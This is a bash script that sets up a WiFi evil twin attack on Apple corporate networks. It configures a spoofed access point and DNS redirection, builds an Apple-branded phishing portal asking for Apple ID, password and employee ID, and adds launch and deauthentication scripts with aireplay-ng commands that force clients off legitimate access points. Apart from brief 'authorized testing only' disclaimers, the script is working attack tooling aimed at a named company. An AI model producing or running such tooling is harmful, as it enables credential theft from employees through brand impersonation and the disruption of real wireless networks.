#!/bin/bash
# Apple Campus WiFi Evil Twin Attack - Simple Setup
# For security testing purposes only

set -e

INTERFACE="en0"
EVIL_SSID="Apple Corporate-Secure"
CHANNEL=6
CAPTIVE_PORTAL_DIR="./apple_captive_portal"

echo "========================================"
echo "   APPLE CAMPUS WIFI ATTACK SIMULATION  "
echo "========================================"
echo ""
echo "[*] Target: Apple Corporate WiFi networks"
echo "[*] Evil Twin SSID: $EVIL_SSID"
echo "[*] Interface: $INTERFACE"
echo ""

# Check WiFi hardware
echo "[1] Checking WiFi hardware..."
if ! networksetup -listallhardwareports | grep -q "$INTERFACE"; then
  echo "[-] WiFi interface $INTERFACE not found"
  echo "[!] Try: ifconfig | grep en"
  exit 1
fi
echo "[+] WiFi interface found: $INTERFACE"

# Create directories
echo "[2] Creating directories..."
mkdir -p "$CAPTIVE_PORTAL_DIR"

# Create hostapd configuration
echo "[3] Creating AP configuration..."
cat > hostapd.conf << APCONF
interface=$INTERFACE
driver=nl80211
ssid=$EVIL_SSID
hw_mode=g
channel=$CHANNEL
macaddr_acl=0
auth_algs=1
ignore_broadcast_ssid=0
wpa=2
wpa_passphrase=AppleSecure2025
wpa_key_mgmt=WPA-PSK
wpa_pairwise=TKIP
rsn_pairwise=CCMP
APCONF

# Create dnsmasq configuration
echo "[4] Creating DHCP/DNS configuration..."
cat > dnsmasq.conf << DNSCONF
interface=$INTERFACE
dhcp-range=10.0.0.10,10.0.0.250,255.255.255.0,12h
dhcp-option=3,10.0.0.1
dhcp-option=6,10.0.0.1
server=8.8.8.8
log-queries
log-dhcp
address=/#/10.0.0.1
DNSCONF

# Create captive portal HTML
echo "[5] Creating Apple-branded captive portal..."
cat > "$CAPTIVE_PORTAL_DIR/index.html" << 'HTML'
<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Apple Corporate WiFi Authentication</title>
    <style>
        body { font-family: -apple-system, BlinkMacSystemFont, sans-serif; background: #f5f5f7; margin: 0; padding: 20px; }
        .container { max-width: 500px; margin: 50px auto; background: white; border-radius: 20px; padding: 40px; box-shadow: 0 10px 30px rgba(0,0,0,0.1); }
        .apple-logo { width: 60px; height: 60px; margin: 0 auto 20px; display: block; }
        h1 { color: #1d1d1f; text-align: center; font-weight: 600; }
        .form-group { margin: 20px 0; }
        label { display: block; margin-bottom: 8px; color: #1d1d1f; font-weight: 500; }
        input { width: 100%; padding: 12px; border: 1px solid #d2d2d7; border-radius: 12px; font-size: 16px; box-sizing: border-box; }
        button { background: #007aff; color: white; border: none; padding: 14px 30px; border-radius: 20px; font-size: 16px; width: 100%; cursor: pointer; font-weight: 500; }
        .warning { background: #fff3cd; border: 1px solid #ffc107; padding: 15px; border-radius: 8px; margin: 20px 0; font-size: 14px; }
        .footer { margin-top: 30px; color: #86868b; font-size: 12px; text-align: center; }
    </style>
</head>
<body>
    <div class="container">
        <svg class="apple-logo" viewBox="0 0 24 24">
            <path fill="#1d1d1f" d="M14.94,5.19A4.38,4.38,0,0,0,16,2,4.44,4.44,0,0,0,13,3.52,4.17,4.17,0,0,0,12,6.61,3.69,3.69,0,0,0,14.94,5.19Zm2.52,7.44a4.51,4.51,0,0,1,2.16-3.81,4.66,4.66,0,0,0-3.66-2c-1.56-.16-3,.91-3.83.91s-2-.89-3.3-.87A4.92,4.92,0,0,0,4.69,9.39C2.93,12.45,4.24,17,6,19.47,6.8,20.68,7.8,22.05,9.12,22s1.75-.76,3.28-.76,2,.76,3.3.73,2.22-1.24,3.06-2.45a11,11,0,0,0,1.38-2.85A4.41,4.41,0,0,1,17.46,12.63Z"/>
        </svg>
        <h1>Apple Corporate WiFi</h1>
        <div class="warning">
            <strong>Security Notice:</strong> Please authenticate with your Apple credentials to access the corporate network.
        </div>
        <form id="authForm">
            <div class="form-group">
                <label for="username">Apple ID (Email)</label>
                <input type="email" id="username" name="username" placeholder="first.last@apple.com" required>
            </div>
            <div class="form-group">
                <label for="password">Password</label>
                <input type="password" id="password" name="password" required>
            </div>
            <div class="form-group">
                <label for="employee_id">Employee ID (Optional)</label>
                <input type="text" id="employee_id" name="employee_id" placeholder="A123456">
            </div>
            <button type="submit">Connect to Network</button>
        </form>
        <div class="footer">
            © 2025 Apple Inc. All rights reserved.<br>
            This network is monitored for security purposes.
        </div>
    </div>
    <script>
        document.getElementById('authForm').addEventListener('submit', function(e) {
            e.preventDefault();
            const formData = new FormData(this);
            const data = Object.fromEntries(formData);
            
            // Simulate credential capture (in real attack, this would send to server)
            console.log('Captured credentials:', data);
            alert('Authentication successful! Connecting to network...');
            
            // Redirect to legitimate Apple site
            setTimeout(() => {
                window.location.href = 'https://www.apple.com';
            }, 2000);
        });
    </script>
</body>
</html>
HTML

# Create start script
echo "[6] Creating attack startup script..."
cat > start_apple_attack.sh << 'START'
#!/bin/bash
echo "[*] Starting Apple Evil Twin Attack..."
echo "[*] Make sure you have:"
echo "    - hostapd installed (brew install hostapd)"
echo "    - dnsmasq installed (brew install dnsmasq)"
echo "    - Python 3 for optional portal server"
echo ""
read -p "Press Enter to continue or Ctrl+C to cancel..."

# Set IP address on interface
echo "[1] Configuring interface $INTERFACE..."
sudo ifconfig $INTERFACE down
sudo ifconfig $INTERFACE 10.0.0.1 netmask 255.255.255.0 up

# Start hostapd (Access Point)
echo "[2] Starting hostapd (AP mode)..."
echo "    SSID: $EVIL_SSID"
echo "    Channel: $CHANNEL"
sudo hostapd hostapd.conf &
HOSTAPD_PID=$!

# Start dnsmasq (DHCP/DNS)
echo "[3] Starting dnsmasq (DHCP/DNS)..."
sudo dnsmasq -C dnsmasq.conf &
DNSMASQ_PID=$!

# Start simple Python HTTP server for captive portal
echo "[4] Starting captive portal..."
cd "$CAPTIVE_PORTAL_DIR"
python3 -m http.server 80 &
PORTAL_PID=$!

echo ""
echo "========================================"
echo "   EVIL TWIN ATTACK RUNNING!"
echo "========================================"
echo "SSID: $EVIL_SSID"
echo "Portal: http://10.0.0.1"
echo "Clients will be redirected to Apple authentication page"
echo ""
echo "To stop attack:"
echo "  sudo kill $HOSTAPD_PID $DNSMASQ_PID $PORTAL_PID"
echo "  sudo ifconfig $INTERFACE down"
echo "========================================"

# Wait for exit
echo ""
echo "Press Ctrl+C to stop attack..."
wait
START

chmod +x start_apple_attack.sh

# Create deauth script
echo "[7] Creating deauthentication script..."
cat > deauth_apple.sh << 'DEAUTH'
#!/bin/bash
# Deauthentication script to force clients to reconnect
echo "[*] Apple WiFi Deauthentication Attack"
echo "[*] This forces clients off legitimate Apple networks"
echo "[*] so they connect to our evil twin"
echo ""
echo "Requirements:"
echo "  1. Put WiFi card in monitor mode"
echo "  2. Find target BSSID (legitimate Apple AP)"
echo "  3. Run: sudo aireplay-ng --deauth 10 -a [BSSID] $INTERFACE"
echo ""
echo "Steps:"
echo "  1. sudo airport $INTERFACE sniff [channel]"
echo "  2. Identify target BSSID from capture"
echo "  3. sudo aireplay-ng --deauth 0 -a [TARGET_BSSID] $INTERFACE"
echo ""
echo "Note: May require external WiFi adapter for monitor mode"
DEAUTH

chmod +x deauth_apple.sh

echo ""
echo "========================================"
echo "   SETUP COMPLETE!"
echo "========================================"
echo "Files created:"
echo "  - hostapd.conf              (AP configuration)"
echo "  - dnsmasq.conf              (DHCP/DNS configuration)"
echo "  - start_apple_attack.sh     (Start evil twin)"
echo "  - deauth_apple.sh           (Deauth instructions)"
echo "  - $CAPTIVE_PORTAL_DIR/      (Captive portal)"
echo ""
echo "NEXT STEPS:"
echo "  1. Install requirements: brew install hostapd dnsmasq"
echo "  2. Run attack: sudo ./start_apple_attack.sh"
echo "  3. Optional: Use deauth_apple.sh to force reconnections"
echo ""
echo "WARNING: For authorized security testing only!"
echo "========================================"
